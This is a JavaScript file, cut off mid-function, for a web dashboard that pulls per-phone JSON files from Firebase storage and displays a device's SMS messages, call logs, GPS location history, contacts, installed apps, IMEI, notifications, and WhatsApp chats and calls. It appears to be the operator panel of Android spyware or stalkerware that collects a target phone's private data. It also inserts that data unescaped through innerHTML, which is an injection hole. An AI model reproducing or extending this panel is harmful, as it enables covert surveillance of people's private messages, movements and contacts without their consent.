var current_user = localStorage.getItem("username");
if (current_user == null) {
    window.alert("You have not logged in");
    window.open("login.html", "_parent");
}
var dashname=document.getElementById("dashboard_name");
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const user = queryString.slice(queryString.indexOf('=') + 1, queryString.length)
// var dash_call=document.getElementById('dash_call');
// var dash_calls=document.getElementById('dash_calls');
// var dash_loc=document.getElementById('dash_loc');
// var dash_device=document.getElementById('dash_device');
// var dash_apps=document.getElementById('dash_apps');
const storageRef = firebase.storage();
var listRef = storageRef.ref(user);

dashname.innerHTML=user;
dashname.setAttribute("href","main.html");
var info_link_ele=document.getElementById('info_link');
info_link='info.html?mob='+user
info_link_ele.setAttribute("href",info_link);
console.log(listRef.fullPath);
var contact_link_ele=document.getElementById('contact_link');
contact_link='contact.html?mob='+user
contact_link_ele.setAttribute("href",contact_link);

var sms_link_ele=document.getElementById('sms_link');
sms_link='sms.html?mob='+user
sms_link_ele.setAttribute("href",sms_link);

var call_link_ele=document.getElementById('call_link');
call_link='call.html?mob='+user
call_link_ele.setAttribute("href",call_link);
// dash_call.setAttribute("href",call_link);
// dash_calls.setAttribute("href",call_link);

var device_link_ele=document.getElementById('device_link');
device_link='device.html?mob='+user
device_link_ele.setAttribute("href",device_link);
// dash_device.setAttribute("href",device_link);

var noti_link_ele=document.getElementById('noti_link');
noti_link='noti.html?mob='+user
noti_link_ele.setAttribute("href",noti_link);

var apps_link_ele=document.getElementById('apps_link');
apps_link='apps.html?mob='+user
apps_link_ele.setAttribute("href",apps_link);
// dash_apps.setAttribute("href",apps_link);

var images_link_ele=document.getElementById('images_link');
images_link='images.html?mob='+user
images_link_ele.setAttribute("href",images_link);

var location_link_ele=document.getElementById('location_link');
location_link='location.html?mob='+user
location_link_ele.setAttribute("href",location_link);
// dash_loc.setAttribute("href",location_link);

var files_link_ele=document.getElementById('files_link');
files_link='files.html?mob='+user
files_link_ele.setAttribute("href",files_link);

var wa_link_ele=document.getElementById('wa_link');
wa_link='wa.html?mob='+user
wa_link_ele.setAttribute("href",wa_link);

var wacall_link_ele=document.getElementById('wacall_link');
wacall_link='wacall.html?mob='+user
wacall_link_ele.setAttribute("href",wacall_link);

var wabuss_link_ele=document.getElementById('wabuss_link');
wabuss_link='wabuss.html?mob='+user
wabuss_link_ele.setAttribute("href",wabuss_link);

var signal_link_ele=document.getElementById('signal_link');
signal_link='signal.html?mob='+user
signal_link_ele.setAttribute("href",signal_link);

//Whatsapp Image and all

var wai_link_ele=document.getElementById('wai_link');
wai_link='wai.html?mob='+user
wai_link_ele.setAttribute("href",wai_link);

var waf_link_ele=document.getElementById('waf_link');
waf_link='waf.html?mob='+user
waf_link_ele.setAttribute("href",waf_link);

var war_link_ele=document.getElementById('war_link');
war_link='war.html?mob='+user
war_link_ele.setAttribute("href",war_link);


function ShowSms() {
    var loader = document.createElement("div");
    loader.setAttribute("id", "loader");
    loader.setAttribute("class", "show_load");
    var content = document.getElementById("content");
    content.innerHTML = "";
    content.appendChild(loader);
    var files_ref = storageRef.ref(user + "/sms.json");
    console.log(files_ref.fullPath);
    files_ref
        .getDownloadURL()
        .then((url) => {
            {
                console.log(url);
                if (document.getElementById("showsms")) {
                    document.getElementById("showsms").remove();
                }
                fetch(url)
                    .then((response) => response.text())
                    .then((data) => {
                        // Do something with your data
                        objsms = JSON.parse(data).smslist;
                        console.log(objsms);
                        var mytable = document.createElement("table");
                        mytable.setAttribute("class", "table ");
                        mytable.setAttribute("id", "showsms");
                        var contact_thead = document.createElement("thead");
                        // contact_thead.setAttribute("style", "position: fixed");
                        var tr = document.createElement("tr");
                        var th = document.createElement("th");
                        th.setAttribute("colspan", "1");
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Address";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.setAttribute("colspan", "1");
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Date";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.setAttribute("colspan", "1");
                        th.setAttribute("style", "width:50%;")
                        th.innerHTML = "Body";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.setAttribute("colspan", "1");
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "SMS Type";
                        tr.appendChild(th);
                        contact_thead.appendChild(tr);
                        mytable.appendChild(contact_thead);
                        var contact_tbody = document.createElement("tbody");
                        objsms.forEach(function(item) {
                            var address = item.address;
                            var date = moment(item.date.slice(0, -3) * 1000).format(
                                "DD-MM-YYYY HH:mm:ss"
                            );
                            var body = item.body;
                            var tr = document.createElement("tr");
                            var td = document.createElement("td");
                            td.innerHTML = address.replaceAll("+", " +");
                            td.setAttribute("style", "word-wrap: nowrap;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = date;
                            td.setAttribute("style", "white-space: nowrap;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = body;
                            td.setAttribute("style", "word-wrap: break-word;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            if (item.type == 1) {
                                td.innerHTML = "Received";
                            } else {
                                td.innerHTML = "Sent";
                            }
                            td.setAttribute("style", "white-space: nowrap;");
                            tr.appendChild(td);

                            contact_tbody.appendChild(tr);
                        });

                        mytable.appendChild(contact_tbody);
                        loader.setAttribute("class", "hide_load");
                        content.appendChild(mytable);
                    });
            }
        })
        .catch((error) => {
            loader.setAttribute("class", "hide_load");
            content.innerHTML = "Data not Found";
            content.setAttribute("style", "color:red;")
        });
}

function ShowLocation() {
    var loader = document.createElement("div");
    loader.setAttribute("id", "loader");
    loader.setAttribute("class", "show_load");
    var content = document.getElementById("content");
    content.setAttribute("style","background-color:white")
    content.innerHTML="";
    content.appendChild(loader);
    var files_ref = storageRef.ref(user + "/location.json");
    console.log(files_ref.fullPath);
    files_ref
        .getDownloadURL()
        .then((url) => {
            {
                console.log(url);
                if (document.getElementById("showlocation")) {
                    document.getElementById("showlocation").remove();
                }
                fetch(url)
                    .then((response) => response.text())
                    .then((data) => {
                        // Do something with your data
                        objsms = JSON.parse(data).locArr;
                        console.log(objsms);
                        var mytable = document.createElement("table");
                        mytable.setAttribute("class", "table ");
                        mytable.setAttribute("id", "showlocation");
                        var contact_thead = document.createElement("thead");
                        var tr = document.createElement("tr");
                        var th = document.createElement("th");
                        th.setAttribute("colspan", "1");
                        th.setAttribute("style", "width:3%;")
                        // th.innerHTML = "<i style='float: left; color:grey;' class='fas fa-globe'></i><br><br>ID";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.setAttribute("colspan", "1");
                        th.setAttribute("style", "width:5%;")
                        th.innerHTML = "Time";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.setAttribute("colspan", "1");
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Date";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.setAttribute("colspan", "1");
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Latitude";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.setAttribute("colspan", "1");
                        th.setAttribute("style", "width:5%;")
                        th.innerHTML = "Longitude";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.setAttribute("colspan", "1");
                        th.setAttribute("style", "width:5%;")
                        th.innerHTML = "Accuracy";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.setAttribute("colspan", "1");
                        th.setAttribute("style", "width:15%;")
                        th.innerHTML = "Address";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.setAttribute("colspan", "1");
                        th.setAttribute("style", "width:7%;")
                        th.innerHTML = "City";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.setAttribute("colspan", "1");
                        th.setAttribute("style", "width:7%;")
                        th.innerHTML = "State";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.setAttribute("colspan", "1");
                        th.setAttribute("style", "width:8%;")
                        th.innerHTML = "Country";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.setAttribute("colspan", "1");
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Postal Code";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.setAttribute("colspan", "1");
                        th.setAttribute("style", "width:7%;")
                        th.innerHTML = "Known Name";
                        tr.appendChild(th);
                        contact_thead.appendChild(tr);
                        mytable.appendChild(contact_thead);
                        var contact_tbody = document.createElement("tbody");
                        objsms.forEach(function(item) {
                            var add = item.add;
                            // var date = moment(item.date.slice(0, -3) * 1000).format(
                            //   "DD-MM-YYYY HH:mm:ss"
                            // );
                            var id = item.id;
                            var lat = item.lat;
                            var time = item.time;
                            var date = item.date;
                            var acc = item.acc;
                            var long = item.long;
                            var city = item.city;
                            var state = item.state;
                            var postal = item.postalCode;
                            var country = item.country;
                            var knownname = item.knownName;
                            var tr = document.createElement("tr");
                            var td = document.createElement("td");
                            td.innerHTML = id;
                            td.setAttribute("style", "word-wrap: nowrap;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = time
                            td.setAttribute("style", "white-space: nowrap;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = date;
                            td.setAttribute("style", "word-wrap: break-word;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = lat;
                            td.setAttribute("style", "word-wrap: break-word;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = long;
                            td.setAttribute("style", "word-wrap: break-word;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = acc;
                            td.setAttribute("style", "word-wrap: break-word;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = add;
                            td.setAttribute("style", "word-wrap: break-word;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = city;
                            td.setAttribute("style", "word-wrap: break-word;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = state;
                            td.setAttribute("style", "word-wrap: break-word;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = country;
                            td.setAttribute("style", "word-wrap: break-word;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = postal;
                            td.setAttribute("style", "word-wrap: break-word;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = knownname;
                            td.setAttribute("style", "word-wrap: break-word;");
                            tr.appendChild(td);

                            contact_tbody.appendChild(tr);
                        });
                        contact_tbody.setAttribute("style","color:black");
                        mytable.appendChild(contact_tbody);
                        loader.setAttribute("class", "hide_load");
                        content.appendChild(mytable);
                    });
            }
        })
        .catch((error) => {
            loader.setAttribute("class", "hide_load");
            content.innerHTML = "Data not Found";
            content.setAttribute("style", "color:red;")
        });
}

function ShowInstalledApps() {
    var loader = document.createElement("div");
    loader.setAttribute("id", "loader");
    loader.setAttribute("class", "show_load");
    var content = document.getElementById("content");
    content.innerHTML = "";
    content.appendChild(loader);
    var files_ref = storageRef.ref(user + "/appdetails.json");
    files_ref
        .getDownloadURL()
        .then((url) => {
            {
                console.log(url);
                if (document.getElementById("appdetails")) {
                    document.getElementById("appdetails").remove();
                }
                fetch(url)
                    .then((response) => response.text())
                    .then((data) => {
                        // Do something with your data
                        obj = JSON.parse(data).apps;
                        console.log(obj);
                        var mytable = document.createElement("table");
                        mytable.setAttribute("class", "table ");
                        mytable.setAttribute("id", "appdetails");
                        var contact_thead = document.createElement("thead");
                        var tr = document.createElement("tr");
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:20%;")
                        th.innerHTML = "Name";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:40%;")
                        th.innerHTML = "Package Name";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:20%;")
                        th.innerHTML = "V - Code";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:20%;")
                        th.innerHTML = "V - Name";
                        tr.appendChild(th);
                        contact_thead.appendChild(tr);
                        mytable.appendChild(contact_thead);
                        var contact_tbody = document.createElement("tbody");
                        obj.forEach(function(item) {
                            var tr = document.createElement("tr");
                            var td = document.createElement("td");
                            td.innerHTML = item.appName;
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.packageName;
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.versionCode;
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.versionName;
                            tr.appendChild(td);

                            contact_tbody.appendChild(tr);
                        });

                        mytable.appendChild(contact_tbody);
                        loader.setAttribute("class", "hide_load");
                        content.appendChild(mytable);
                    });
            }
        })
        .catch((error) => {
            loader.setAttribute("class", "hide_load");
            content.innerHTML = "Data not Found";
            content.setAttribute("style", "color:red;")
        });
}


// var con=document.getElementById("contact");
// con.onclick=ShowContact();
function ShowContact() {
    var loader = document.createElement("div");
    loader.setAttribute("id", "loader");
    loader.setAttribute("class", "show_load");
    var content = document.getElementById("content");
    content.innerHTML = "";
    content.appendChild(loader);
    var files_ref = storageRef.ref(user + "/contacts.json");
    files_ref
        .getDownloadURL()
        .then((url) => {
            {
                console.log(url);
                if (document.getElementById("contacts")) {
                    document.getElementById("contacts").remove();
                }
                fetch(url)
                    .then((response) => response.text())
                    .then((data) => {
                        // Do something with your data
                        obj = JSON.parse(data).contactsList;
                        console.log(obj);
                        var mytable = document.createElement("table");
                        mytable.setAttribute("class", "table");
                        // mytable.setAttribute("class", "content-table");
                        mytable.setAttribute("id", "contacts");
                        var contact_thead = document.createElement("thead");
                        var tr = document.createElement("tr");
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:50%;")
                        // th.setAttribute("style","margin-left:-100px");
                        th.innerHTML = "Name";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:50%;")
                        th.innerHTML = "Phone Number";
                        tr.appendChild(th);
                        contact_thead.appendChild(tr);
                        mytable.appendChild(contact_thead);
                        var contact_tbody = document.createElement("tbody");
                        obj.forEach(function(item) {
                            var tr = document.createElement("tr");
                            var td = document.createElement("td");
                            td.innerHTML = item.name;
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.phoneNo;
                            tr.appendChild(td);
                            contact_tbody.appendChild(tr);
                        });

                        mytable.appendChild(contact_tbody);
                        loader.setAttribute("class", "hide_load");
                        content.appendChild(mytable);
                    });
            }
        })
        .catch((error) => {
            loader.setAttribute("class", "hide_load");
            content.innerHTML = "Data not Found";
            content.setAttribute("style", "color:red;")
        });
}

function ShowDeviceInfo() {
    var loader = document.createElement("div");
    loader.setAttribute("id", "loader");
    loader.setAttribute("class", "show_load");
    var content = document.getElementById("content");
    content.innerHTML = "";
    content.appendChild(loader);
    var files_ref = storageRef.ref(user + "/device.json");
    files_ref
        .getDownloadURL()
        .then((url) => {
            {
                console.log(url);
                if (document.getElementById("device")) {
                    document.getElementById("device").remove();
                }
                fetch(url)
                    .then((response) => response.text())
                    .then((data) => {
                        // Do something with your data
                        obj = JSON.parse(data);
                        console.log(obj);
                        var mytable = document.createElement("table");
                        mytable.setAttribute("class", "table ");
                        mytable.setAttribute("id", "device");
                        var contact_thead = document.createElement("thead");
                        var tr = document.createElement("tr");
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.innerHTML = "Model";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.innerHTML = "Manufacturer";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.innerHTML = "Release";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.innerHTML = "IMEI";
                        tr.appendChild(th);
                        contact_thead.appendChild(tr);
                        mytable.appendChild(contact_thead);
                        var contact_tbody = document.createElement("tbody");
                        var tr = document.createElement("tr");
                        var td = document.createElement("td");
                        td.innerHTML = obj.model;
                        tr.appendChild(td);
                        var td = document.createElement("td");
                        td.innerHTML = obj.manf;
                        tr.appendChild(td);
                        var td = document.createElement("td");
                        td.innerHTML = obj.release;
                        tr.appendChild(td);
                        var td = document.createElement("td");
                        td.innerHTML = obj.imei;
                        tr.appendChild(td);
                        contact_tbody.appendChild(tr);

                        mytable.appendChild(contact_tbody);
                        loader.setAttribute("class", "hide_load");
                        content.appendChild(mytable);
                    });
            }
        })
        .catch((error) => {
            loader.setAttribute("class", "hide_load");
            content.innerHTML = "Data not Found";
            content.setAttribute("style", "color:red;")
        });
}

function ShowCallLogs() {
    var loader = document.createElement("div");
    loader.setAttribute("id", "loader");
    loader.setAttribute("class", "show_load");
    var content = document.getElementById("content");
    content.innerHTML = "";
    content.appendChild(loader);
    var files_ref = storageRef.ref(user + "/logs.json");
    files_ref
        .getDownloadURL()
        .then((url) => {
            {
                console.log(url);
                if (document.getElementById("logs")) {
                    document.getElementById("logs").remove();
                }
                fetch(url)
                    .then((response) => response.text())
                    .then((data) => {
                        // Do something with your data
                        obj = JSON.parse(data).callsList;
                        console.log(obj);
                        obj.reverse();
                        var mytable = document.createElement("table");
                        mytable.setAttribute("class", "table ");
                        mytable.setAttribute("id", "logs");
                        var contact_thead = document.createElement("thead");
                        var tr = document.createElement("tr");
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.innerHTML = "Date";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.innerHTML = "Name";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.innerHTML = "Phone Number";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.innerHTML = "Duration";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.innerHTML = "Call Type";
                        tr.appendChild(th);
                        contact_thead.appendChild(tr);
                        mytable.appendChild(contact_thead);
                        var contact_tbody = document.createElement("tbody");
                        // obj.sort(GetSortOrder("date"));
                        obj.forEach(function(item) {
                            var tr = document.createElement("tr");
                            var td = document.createElement("td");
                            td.innerHTML = moment(item.date.slice(0, -3) * 1000).format(
                                "DD-MM-YYYY HH:mm:ss"
                            );
                            td.setAttribute("style", "white-space: nowrap;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.name;
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.phoneNo;
                            tr.appendChild(td);
                            contact_tbody.appendChild(tr);
                            var td = document.createElement("td");
                            td.innerHTML = item.duration;
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            if (item.type == 1) {
                                td.innerHTML = "Incoming Call";
                            } else if (item.type == 2) {
                                td.innerHTML = "Missed Call";
                            } else {
                                td.innerHTML = "Outgoing Call";
                            }
                            tr.appendChild(td);
                            contact_tbody.appendChild(tr);
                        });

                        mytable.appendChild(contact_tbody);
                        loader.setAttribute("class", "hide_load");
                        content.appendChild(mytable);
                    });
            }
        })
        .catch((error) => {
            loader.setAttribute("class", "hide_load");
            content.innerHTML = "Data not Found";
            content.setAttribute("style", "color:red;")
        });
}

function ShowNotifications() {
    var sr = 1;
    var atleastone = false;
    var loader = document.createElement("div");
    loader.setAttribute("id", "loader");
    loader.setAttribute("class", "show_load");
    var content = document.getElementById("content");
    content.innerHTML = "";
    content.appendChild(loader);

    var files_ref = storageRef.ref(user + "/noti");
    files_ref
        .listAll()
        .then((res) => {
            var table = document.createElement("table");
            table.setAttribute("id", "noti");
            table.setAttribute("class", "table");
            var thead = document.createElement("thead");
            thead.setAttribute("id", "thead");
            var tr = document.createElement("tr");
            var th = document.createElement("th");
            th.scope = "col";
            th.setAttribute("style", "width:15%;")
            th.innerHTML = "Date";
            tr.appendChild(th);
            var th = document.createElement("th");
            th.scope = "col";
            th.setAttribute("style", "width:60%;")
            th.innerHTML = "Application Name";
            tr.appendChild(th);
            var th = document.createElement("th");
            th.scope = "col";
            th.setAttribute("style", "width:20%;")
            th.innerHTML = "Content";
            tr.appendChild(th);
            thead.appendChild(tr);
            var tbody = document.createElement("tbody");

            res.items.forEach((itemRef) => {
                atleastone = true;
                itemRef
                    .getDownloadURL()
                    .then((url) => {
                        fetch(url)
                            .then((response) => response.text())
                            .then((data) => {
                                // Do something with your data
                                obj = JSON.parse(data);
                                // All the items under listRef.
                                var tr = document.createElement("tr");
                                var td = document.createElement("td");
                                td.innerHTML = moment(
                                    obj.postTime.toString().slice(0, -3) * 1000
                                ).format("DD-MM-YYYY HH:mm:ss");
                                //   moment(obj.postTime.toString() * 1000).format(
                                //   "DD-MM-YYYY HH:mm:ss"
                                // );
                                td.setAttribute("style", "white-space: nowrap;");
                                tr.appendChild(td);
                                var td = document.createElement("td");
                                td.innerHTML = obj.appName;
                                tr.appendChild(td);
                                var td = document.createElement("td");
                                var title = document.createElement("p");
                                title.setAttribute("style", "font-weight: 900;");
                                title.innerHTML = obj.title;
                                td.appendChild(title);
                                var content = document.createElement("p");
                                content.setAttribute("style", "font-weight: normal;");
                                content.innerHTML = obj.content;
                                td.appendChild(content);
                                tr.appendChild(td);
                                tbody.appendChild(tr);
                                console.log(itemRef.name);
                            });
                    })
                    .catch((error) => {
                        loader.setAttribute("class", "hide_load");
                        content.innerHTML = "Data not Found";
                        content.setAttribute("style", "color:red;")
                    });
            });

            table.appendChild(thead);
            table.appendChild(tbody);
            loader.setAttribute("class", "hide_load");
            content.appendChild(table);
        })
        .catch((error) => {
            loader.setAttribute("class", "hide_load");
            content.innerHTML = "Data not Found";
            content.setAttribute("style", "color:red;")
        });
}

function ShowWhatsapp() {
    var loader = document.createElement("div");
    loader.setAttribute("id", "loader");
    loader.setAttribute("class", "show_load");
    var content = document.getElementById("content");
    content.innerHTML = "";
    content.appendChild(loader);
    var files_ref = storageRef.ref(user + "/wa.json");
    files_ref
        .getDownloadURL()
        .then((url) => {
            {
                console.log(url);
                if (document.getElementById("wa")) {
                    document.getElementById("wa").remove();
                }
                fetch(url)
                    .then((response) => response.text())
                    .then((data) => {
                        // Do something with your data
                        obj = JSON.parse(data).WhatsappList;
                        var mytable = document.createElement("table");
                        mytable.setAttribute("class", "table ");
                        mytable.setAttribute("id", "wa");
                        var contact_thead = document.createElement("thead");
                        var tr = document.createElement("tr");
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Date";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Divider";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Name";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:60%;")
                        th.innerHTML = "Text";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Type";
                        tr.appendChild(th);
                        contact_thead.appendChild(tr);
                        mytable.appendChild(contact_thead);
                        var contact_tbody = document.createElement("tbody");
                        // obj.sort(GetSortOrder("date"));
                        for (var i = 0; i < obj.length; i++) {
                            delete obj[i].id;
                        }
                        console.log(obj);
                        jsonObject = obj.map(JSON.stringify);
                        uniqueSet = new Set(jsonObject);
                        uniqueArray = Array.from(uniqueSet).map(JSON.parse);
                        console.log(uniqueArray);
                        uniqueArray.forEach(function(item) {
                            var tr = document.createElement("tr");
                            var td = document.createElement("td");
                            td.innerHTML = item.date;
                            td.setAttribute("style", "white-space: nowrap;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.divider;
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.name;
                            td.setAttribute("style", "white-space: nowrap;");
                            tr.appendChild(td);
                            contact_tbody.appendChild(tr);
                            var td = document.createElement("td");
                            td.innerHTML = item.text;
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.type;
                            tr.appendChild(td);
                            contact_tbody.appendChild(tr);
                        });

                        mytable.appendChild(contact_tbody);
                        loader.setAttribute("class", "hide_load");
                        content.appendChild(mytable);
                    });
            }
        })
        .catch((error) => {
            loader.setAttribute("class", "hide_load");
            content.innerHTML = "Data not Found";
            content.setAttribute("style", "color:red;")
        });
}

function ShowWhatsappcalllog() {
    var loader = document.createElement("div");
    loader.setAttribute("id", "loader");
    loader.setAttribute("class", "show_load");
    var content = document.getElementById("content");
    content.innerHTML = "";
    content.appendChild(loader);
    var files_ref = storageRef.ref(user + "/wacall.json");
    files_ref
        .getDownloadURL()
        .then((url) => {
            {
                console.log(url);
                if (document.getElementById("wacall")) {
                    document.getElementById("wacall").remove();
                }
                fetch(url)
                    .then((response) => response.text())
                    .then((data) => {
                        console.log(data);
                        // Do something with your data
                        obj = JSON.parse(data).WhatsappcallList;
                        var mytable = document.createElement("table");
                        mytable.setAttribute("class", "table ");
                        mytable.setAttribute("id", "wacall");
                        var contact_thead = document.createElement("thead");
                        var tr = document.createElement("tr");
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:20%;")
                        th.innerHTML = "Date";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:20%;")
                        th.innerHTML = "Name";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:20%;")
                        th.innerHTML = "Type";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:20%;")
                        th.innerHTML = "Count";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:20%;")
                        th.innerHTML = "Audio / Video";
                        tr.appendChild(th);
                        contact_thead.appendChild(tr);
                        mytable.appendChild(contact_thead);
                        var contact_tbody = document.createElement("tbody");
                        // obj.sort(GetSortOrder("date"));
                        for (var i = 0; i < obj.length; i++) {
                            delete obj[i].id;
                        }
                        console.log(obj);
                        jsonObject = obj.map(JSON.stringify);
                        uniqueSet = new Set(jsonObject);
                        uniqueArray = Array.from(uniqueSet).map(JSON.parse);
                        console.log(uniqueArray);
                        uniqueArray.forEach(function(item) {
                            var tr = document.createElement("tr");
                            var td = document.createElement("td");
                            td.innerHTML = item.date;
                            td.setAttribute("style", "white-space: nowrap;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.name;
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.type;
                            td.setAttribute("style", "white-space: nowrap;");
                            tr.appendChild(td);
                            contact_tbody.appendChild(tr);
                            var td = document.createElement("td");
                            td.innerHTML = item.count;
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.audiovideo;
                            tr.appendChild(td);
                            contact_tbody.appendChild(tr);
                        });

                        mytable.appendChild(contact_tbody);
                        loader.setAttribute("class", "hide_load");
                        content.appendChild(mytable);
                    });
            }
        })
        .catch((error) => {
            loader.setAttribute("class", "hide_load");
            content.innerHTML = "Data not Found";
            content.setAttribute("style", "color:red;")
        });
}

function ShowWhatsappb() {
    var loader = document.createElement("div");
    loader.setAttribute("id", "loader");
    loader.setAttribute("class", "show_load");
    var content = document.getElementById("content");
    content.innerHTML = "";
    content.appendChild(loader);
    var files_ref = storageRef.ref(user + "/wab.json");
    files_ref
        .getDownloadURL()
        .then((url) => {
            {
                console.log(url);
                if (document.getElementById("wab")) {
                    document.getElementById("wab").remove();
                }
                fetch(url)
                    .then((response) => response.text())
                    .then((data) => {
                        // Do something with your data
                        obj = JSON.parse(data).WhatsappList;
                        var mytable = document.createElement("table");
                        mytable.setAttribute("class", "table ");
                        mytable.setAttribute("id", "wab");
                        var contact_thead = document.createElement("thead");
                        var tr = document.createElement("tr");
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Date";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Divider";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Name";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:60%;")
                        th.innerHTML = "Text";
                        tr.appendChild(th);
                        var th = document.createElement("th");
                        th.scope = "col";
                        th.setAttribute("style", "width:10%;")
                        th.innerHTML = "Type";
                        tr.appendChild(th);
                        contact_thead.appendChild(tr);
                        mytable.appendChild(contact_thead);
                        var contact_tbody = document.createElement("tbody");
                        // obj.sort(GetSortOrder("date"));
                        for (var i = 0; i < obj.length; i++) {
                            delete obj[i].id;
                        }
                        console.log(obj);
                        jsonObject = obj.map(JSON.stringify);
                        uniqueSet = new Set(jsonObject);
                        uniqueArray = Array.from(uniqueSet).map(JSON.parse);

                        console.log(uniqueArray);
                        uniqueArray.forEach(function(item) {
                            var tr = document.createElement("tr");
                            var td = document.createElement("td");
                            td.innerHTML = item.date;
                            td.setAttribute("style", "white-space: nowrap;");
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.divider;
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.name;
                            td.setAttribute("style", "white-space: nowrap;");
                            tr.appendChild(td);
                            contact_tbody.appendChild(tr);
                            var td = document.createElement("td");
                            td.innerHTML = item.text;
                            tr.appendChild(td);
                            var td = document.createElement("td");
                            td.innerHTML = item.type;
                            tr.appendChild(td);
                            contact_tbody.appendChild(tr);
                        });

                        mytable.appendChild(contact_tbody);

                        loader.setAttribute("class", "hide_load");
